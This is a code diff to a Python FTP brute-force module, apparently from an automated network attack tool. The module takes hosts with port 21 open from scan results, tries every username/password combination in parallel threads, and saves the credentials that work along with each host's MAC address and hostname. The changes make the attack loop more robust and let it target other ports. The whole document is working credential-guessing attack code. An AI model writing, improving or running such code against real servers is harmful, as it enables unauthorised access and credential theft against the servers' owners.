@@ -6,7 +6,7 @@ import time
 from rich.console import Console
 from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
 from ftplib import FTP
-from queue import Queue
+from queue import Queue, Empty
 from shared import SharedData
 from logger import Logger
 
@@ -79,13 +79,13 @@ class FTPConnector:
             self.scan["Ports"] = None
         self.scan = self.scan[self.scan["Ports"].str.contains("21", na=False)]
 
-    def ftp_connect(self, adresse_ip, user, password):
+    def ftp_connect(self, adresse_ip, user, password, port=21):
         """
         Attempts to connect to the FTP server using the provided username and password.
         """
         try:
             conn = FTP()
-            conn.connect(adresse_ip, 21)
+            conn.connect(adresse_ip, int(port))
             conn.login(user, password)
             conn.quit()
             logger.info(f"Access to FTP successful on {adresse_ip} with user '{user}'")
@@ -97,21 +97,30 @@ class FTPConnector:
         """
         Worker thread to process items in the queue.
         """
-        while not self.queue.empty():
+        while True:
             if self.shared_data.orchestrator_should_exit:
                 logger.info("Orchestrator exit signal received, stopping worker thread.")
                 break
 
-            adresse_ip, user, password, mac_address, hostname, port = self.queue.get()
-            if self.ftp_connect(adresse_ip, user, password):
-                with self.lock:
-                    self.results.append([mac_address, adresse_ip, hostname, user, password, port])
-                    logger.success(f"Found credentials for IP: {adresse_ip} | User: {user}")
-                    self.save_results()
-                    self.removeduplicates()
-                    success_flag[0] = True
-            self.queue.task_done()
-            progress.update(task_id, advance=1)
+            try:
+                item = self.queue.get(timeout=0.5)
+            except Empty:
+                if self.queue.empty():
+                    break
+                continue
+
+            adresse_ip, user, password, mac_address, hostname, port = item
+            try:
+                if self.ftp_connect(adresse_ip, user, password, port):
+                    with self.lock:
+                        self.results.append([mac_address, adresse_ip, hostname, user, password, port])
+                        logger.success(f"Found credentials for IP: {adresse_ip} | User: {user}")
+                        self.save_results()
+                        self.removeduplicates()
+                        success_flag[0] = True
+            finally:
+                self.queue.task_done()
+                progress.update(task_id, advance=1)
 
     def run_bruteforce(self, adresse_ip, port):
         self.load_scan_file()  # Reload the scan file to get the latest IPs and ports
@@ -119,8 +128,14 @@ class FTPConnector:
         mac_address = self.scan.loc[self.scan['IPs'] == adresse_ip, 'MAC Address'].values[0]
         hostname = self.scan.loc[self.scan['IPs'] == adresse_ip, 'Hostnames'].values[0]
 
-        total_tasks = len(self.users) * len(self.passwords) + 1  # Include one for the anonymous attempt
-        
+        # Drain any leftover work from a previous run
+        while not self.queue.empty():
+            try:
+                self.queue.get_nowait()
+                self.queue.task_done()
+            except Exception:
+                break
+
         for user in self.users:
             for password in self.passwords:
                 if self.shared_data.orchestrator_should_exit:
@@ -128,24 +143,18 @@ class FTPConnector:
                     return False, []
                 self.queue.put((adresse_ip, user, password, mac_address, hostname, port))
 
+        total_tasks = self.queue.qsize()
         success_flag = [False]
         threads = []
+        worker_count = min(10, max(1, total_tasks))
 
         with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
             task_id = progress.add_task("[cyan]Bruteforcing FTP...", total=total_tasks)
 
-            for _ in range(40):  # Adjust the number of threads based on the RPi Zero's capabilities
+            for _ in range(worker_count):
                 t = threading.Thread(target=self.worker, args=(progress, task_id, success_flag))
                 t.start()
                 threads.append(t)
-
-            while not self.queue.empty():
-                if self.shared_data.orchestrator_should_exit:
-                    logger.info("Orchestrator exit signal received, stopping bruteforce.")
-                    while not self.queue.empty():
-                        self.queue.get()
-                        self.queue.task_done()
-                    break
 
             self.queue.join()
 
